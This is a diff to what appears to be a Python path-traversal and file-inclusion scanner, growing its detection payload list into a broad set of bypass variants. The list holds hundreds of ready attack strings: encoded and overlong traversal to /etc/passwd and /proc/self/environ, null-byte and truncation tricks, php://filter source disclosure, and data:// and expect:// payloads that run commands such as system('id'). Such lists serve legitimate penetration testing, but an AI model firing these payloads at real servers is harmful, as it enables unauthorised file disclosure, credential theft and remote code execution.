@@ -26,9 +26,12 @@ SIGNATURES = {
     "/proc/version": ["Linux version"],
 }
 
-# Small curated detection payloads (ordered by likelihood)
+# Comprehensive detection payloads — every bypass variant
 DETECTION_PAYLOADS = [
-    # Basic traversal depths
+
+    # ==========================================
+    # 1) BASIC TRAVERSAL (depth 1-10)
+    # ==========================================
     "../etc/passwd",
     "../../etc/passwd",
     "../../../etc/passwd",
@@ -36,48 +39,235 @@ DETECTION_PAYLOADS = [
     "../../../../../etc/passwd",
     "../../../../../../etc/passwd",
     "../../../../../../../etc/passwd",
+    "../../../../../../../../etc/passwd",
+    "../../../../../../../../../etc/passwd",
+    "../../../../../../../../../../etc/passwd",
 
-    # Direct absolute path
+    # ==========================================
+    # 2) DIRECT / ABSOLUTE PATH
+    # ==========================================
     "/etc/passwd",
+    "etc/passwd",
 
-    # Null byte bypass (old PHP)
+    # ==========================================
+    # 3) DOUBLE SLASH BYPASS  ....//
+    # ==========================================
+    "....//etc/passwd",
+    "....//....//etc/passwd",
+    "....//....//....//etc/passwd",
+    "....//....//....//....//etc/passwd",
+    "....//....//....//....//....//etc/passwd",
+    "....//....//....//....//....//....//etc/passwd",
+
+    # ==========================================
+    # 4) DOT-SLASH-DOT BYPASS  ..././
+    # ==========================================
+    "..././etc/passwd",
+    "..././..././etc/passwd",
+    "..././..././..././etc/passwd",
+    "..././..././..././..././etc/passwd",
+    "..././..././..././..././..././etc/passwd",
+    "..././..././..././..././..././..././etc/passwd",
+
+    # ==========================================
+    # 5) DOUBLE DOT DOUBLE SLASH  ..//
+    # ==========================================
+    "..//..//..//..//..//..//etc/passwd",
+    "..//../..//../..//../..//..//etc/passwd",
+
+    # ==========================================
+    # 6) BACKSLASH VARIANTS  ..\
+    # ==========================================
+    "..\\etc\\passwd",
+    "..\\..\\etc\\passwd",
+    "..\\..\\..\\etc\\passwd",
+    "..\\..\\..\\..\\..\\..\\etc\\passwd",
+    ".\\.\\.\\.\\.\\.\\etc\\passwd",
+
+    # ==========================================
+    # 7) MIXED SLASH VARIANTS  ../ + ..\
+    # ==========================================
+    "..\\/etc/passwd",
+    "..\\/..\\//etc/passwd",
+    "../..\\/../..\\/../..\\//etc/passwd",
+    "..\\/../\\..//etc/passwd",
+
+    # ==========================================
+    # 8) NULL BYTE BYPASS  %00
+    # ==========================================
     "../../../../../../etc/passwd%00",
     "../../../../../../etc/passwd%00.php",
     "../../../../../../etc/passwd%00.html",
+    "../../../../../../etc/passwd%00.jpg",
+    "../../../../../../etc/passwd%00.txt",
+    "../../../../../../etc/passwd%00.png",
+    "../../../../../../etc/passwd%00.inc",
+    "/etc/passwd%00",
+    "/etc/passwd%00.php",
 
-    # Slash bypass variants
-    "....//....//....//....//....//....//etc/passwd",
-    "..././..././..././..././..././..././etc/passwd",
-
-    # URL encoded
+    # ==========================================
+    # 9) URL ENCODED ../
+    # ==========================================
+    # ../ = ..%2f
+    "..%2fetc%2fpasswd",
+    "..%2f..%2fetc%2fpasswd",
+    "..%2f..%2f..%2fetc%2fpasswd",
     "..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
+
+    # ../ = %2e%2e/
+    "%2e%2e/etc/passwd",
+    "%2e%2e/%2e%2e/etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+
+    # ../ = %2e%2e%2f (full encode)
+    "%2e%2e%2fetc%2fpasswd",
+    "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
     "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
 
-    # Double URL encoded
+    # . = %2e only
+    "%2e./etc/passwd",
+    "%2e./%2e./etc/passwd",
+    "%2e./%2e./%2e./%2e./%2e./%2e./etc/passwd",
+
+    # / = %2f only
+    "..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+
+    # ==========================================
+    # 10) DOUBLE URL ENCODED
+    # ==========================================
+    # ../ = ..%252f
+    "..%252fetc%252fpasswd",
+    "..%252f..%252fetc%252fpasswd",
     "..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd",
 
-    # Unicode / UTF-8 overlong
-    "%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc%c0%afpasswd",
-    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc/passwd",
+    # . = %252e
+    "%252e%252e/etc/passwd",
+    "%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd",
 
-    # Backslash variants
-    "..\\..\\..\\..\\..\\..\\etc\\passwd",
+    # full double encode
+    "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+    "%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd",
 
-    # PHP wrappers
+    # ==========================================
+    # 11) UNICODE / UTF-8 OVERLONG ENCODING
+    # ==========================================
+    # / = %c0%af (overlong UTF-8)
+    "..%c0%afetc%c0%afpasswd",
+    "..%c0%af..%c0%afetc%c0%afpasswd",
+    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
+
+    # . = %c0%2e
+    "%c0%2e%c0%2e/etc/passwd",
+    "%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/%c0%2e%c0%2e/etc/passwd",
+    "%c0%2e%c0%2e%c0%afetc%c0%afpasswd",
+    "%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%af%c0%2e%c0%2e%c0%afetc%c0%afpasswd",
+
+    # / = %ef%bc%8f (fullwidth solidus)
+    "..%ef%bc%8fetc%ef%bc%8fpasswd",
+    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8fetc/passwd",
+
+    # / = %c1%9c (overlong backslash)
+    "..%c1%9cetc%c1%9cpasswd",
+    "..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd",
+
+    # ==========================================
+    # 12) PATH TRUNCATION (long path)
+    # ==========================================
+    "../../../../../../etc/passwd" + "/." * 50,
+    "../../../../../../etc/passwd" + "A" * 4096,
+    "/etc/passwd" + "%00" + "A" * 100,
+
+    # ==========================================
+    # 13) DOT SEGMENT ABUSE
+    # ==========================================
+    "/etc/./passwd",
+    "/etc/passwd/.",
+    "./../../../../../../etc/passwd",
+    "./../../../../../../../etc/passwd",
+    "/./etc/./passwd",
+    "/../../../../../../../etc/passwd",
+
+    # ==========================================
+    # 14) WRAPPER: file://
+    # ==========================================
+    "file:///etc/passwd",
+    "file:///etc/hosts",
+    "file://localhost/etc/passwd",
+    "file://127.0.0.1/etc/passwd",
+
+    # ==========================================
+    # 15) WRAPPER: php://filter
+    # ==========================================
     "php://filter/convert.base64-encode/resource=index.php",
     "php://filter/convert.base64-encode/resource=config.php",
     "php://filter/convert.base64-encode/resource=../config.php",
+    "php://filter/convert.base64-encode/resource=../../config.php",
+    "php://filter/convert.base64-encode/resource=login.php",
+    "php://filter/convert.base64-encode/resource=../index.php",
+    "php://filter/string.rot13/resource=index.php",
+    "php://filter/convert.iconv.utf-8.utf-16/resource=index.php",
+    "php://filter/read=convert.base64-encode/resource=index.php",
+    "php://filter/resource=/etc/passwd",
+    "php://filter/convert.base64-encode/resource=/etc/passwd",
 
-    # file:// wrapper
-    "file:///etc/passwd",
-    "file:///etc/hosts",
+    # ==========================================
+    # 16) WRAPPER: php://input
+    # ==========================================
+    "php://input",
+    "php://input%00",
 
-    # /proc checks
+    # ==========================================
+    # 17) WRAPPER: data://
+    # ==========================================
+    "data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==",
+    "data://text/plain,<?php system('id'); ?>",
+
+    # ==========================================
+    # 18) WRAPPER: expect://
+    # ==========================================
+    "expect://id",
+    "expect://whoami",
+
+    # ==========================================
+    # 19) /proc FILESYSTEM
+    # ==========================================
+    "/proc/self/environ",
     "../../../../../../proc/self/environ",
+    "/proc/version",
     "../../../../../../proc/version",
+    "/proc/self/cmdline",
+    "../../../../../../proc/self/cmdline",
 
-    # /etc/hosts as fallback
+    # ==========================================
+    # 20) FALLBACK TARGETS
+    # ==========================================
+    "/etc/hosts",
     "../../../../../../etc/hosts",
+    "/etc/hostname",
+    "../../../../../../etc/hostname",
+    "/etc/issue",
+    "../../../../../../etc/issue",
+
+    # ==========================================
+    # 21) CASE VARIATION
+    # ==========================================
+    "../../../../../../ETC/PASSWD",
+    "../../../../../../Etc/Passwd",
+
+    # ==========================================
+    # 22) TAB / NEWLINE INJECTION
+    # ==========================================
+    "..%09/..%09/..%09/..%09/..%09/..%09/etc/passwd",
+    "..%0a/..%0a/..%0a/..%0a/..%0a/..%0a/etc/passwd",
+
+    # ==========================================
+    # 23) HASH / QUESTION MARK TERMINATION
+    # ==========================================
+    "../../../../../../etc/passwd#",
+    "../../../../../../etc/passwd?",
+    "../../../../../../etc/passwd?.jpg",
 ]
 
 
